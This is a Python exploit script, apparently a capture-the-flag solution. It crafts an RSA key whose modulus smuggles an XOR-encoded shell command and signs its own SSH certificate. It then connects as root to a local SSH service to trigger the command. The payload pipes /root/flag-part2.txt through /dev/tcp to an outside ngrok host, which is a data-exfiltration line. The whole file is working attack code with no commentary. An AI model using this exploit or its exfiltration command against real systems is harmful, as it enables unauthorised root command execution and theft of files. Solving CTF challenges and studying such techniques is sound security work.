#!/usr/bin/env python3

import struct
import base64
import datetime
import io

import gmpy2
import paramiko

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import (
    NoEncryption, SSHCertificateType, SSHCertificateBuilder, Encoding,
    PrivateFormat)

FLAG1 = 'SSM{based_0n_4_Tru3_St0ry}'
INIT_HANDLE = 0x34868dbd

HOST = 'localhost'
PORT = 50000


def create_chosen_key(command):
    cmd_cstr = f'{command}\0'
    cmd_enc = bytes(x ^ 0x41 for x in cmd_cstr.encode())
    cmd_enc = FLAG1.encode() + cmd_enc
    n_bytes = struct.pack('<III', 0x13371337, INIT_HANDLE,
                          len(cmd_enc) ^ 0x41414141) + cmd_enc
    n_bytes = n_bytes.ljust(256, b'\0')
    target_n = int.from_bytes(n_bytes, 'big')
    p = 3
    start_q = target_n // p
    q = int(gmpy2.next_prime(start_q))
    e = 0x10001

    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    assert (e * d) % phi == 1
    private_key = rsa.RSAPrivateNumbers(p, q, d, rsa.rsa_crt_dmp1(d, p),
                                        rsa.rsa_crt_dmq1(d, q),
                                        rsa.rsa_crt_iqmp(p, q),
                                        rsa.RSAPublicNumbers(e, p *
                                                             q)).private_key()

    return private_key


def create_certificate(private_key):
    valid_after = datetime.datetime(1970,
                                    1,
                                    1,
                                    1,
                                    tzinfo=datetime.timezone.utc).timestamp()
    valid_before = datetime.datetime(2035,
                                     1,
                                     1,
                                     1,
                                     tzinfo=datetime.timezone.utc).timestamp()

    builder = (SSHCertificateBuilder().public_key(
        private_key.public_key()).type(SSHCertificateType.USER).valid_before(
            valid_before).valid_after(valid_after).valid_for_all_principals())

    signed_cert = builder.sign(private_key)
    return signed_cert


def convert_cert_to_openssh(private_key, signed_cert):
    signed_cert_pub = signed_cert.public_bytes().decode()

    private_key_pem = private_key.private_bytes(
        encoding=Encoding.PEM,
        format=PrivateFormat.OpenSSH,
        encryption_algorithm=NoEncryption()).decode()
    """
    with open('attack-debug.pem', 'w') as fout:
        fout.write(private_key_pem)
    with open('attack-debug-cert.pub', 'w') as fout:
        fout.write(signed_cert_pub)
    """

    key_file = io.StringIO(private_key_pem)
    private_key = paramiko.RSAKey.from_private_key(key_file)
    private_key.load_certificate(signed_cert_pub)

    return private_key


def main():
    payload = '/bin/bash -c "cat /root/flag-part2.txt > /dev/tcp/0.tcp.eu.ngrok.io/11531"'
    private_key = create_chosen_key(payload)
    signed_cert = create_certificate(private_key)
    openssh_key = convert_cert_to_openssh(private_key, signed_cert)

    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sshclient.connect(hostname=HOST,
                      username='root',
                      pkey=openssh_key,
                      port=PORT)


if __name__ == '__main__':
    main()
